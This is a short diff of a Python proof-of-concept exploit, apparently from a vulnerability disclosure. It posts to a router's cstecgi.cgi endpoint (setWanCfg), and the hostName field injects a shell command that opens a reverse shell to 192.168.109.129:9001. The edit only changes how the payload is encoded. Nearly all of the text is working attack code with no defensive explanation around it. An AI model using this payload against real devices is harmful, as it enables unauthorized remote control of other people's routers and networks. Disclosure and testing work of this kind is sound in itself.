@@ -25,13 +25,13 @@ import requests
 
 url = "http://192.168.0.1/cgi-bin/cstecgi.cgi"
 
-payload = {
+payload = """{
     "proto": "9",
     "hostName": "';sh -i >& /dev/tcp/192.168.109.129/9001 0>&1;#",
     "switchOpMode": "1",
     "topicurl": "setWanCfg",
     "token": "00000000000000000000000000000000"
-}
+}"""
 
 requests.request("POST", url, data=payload)
 ```
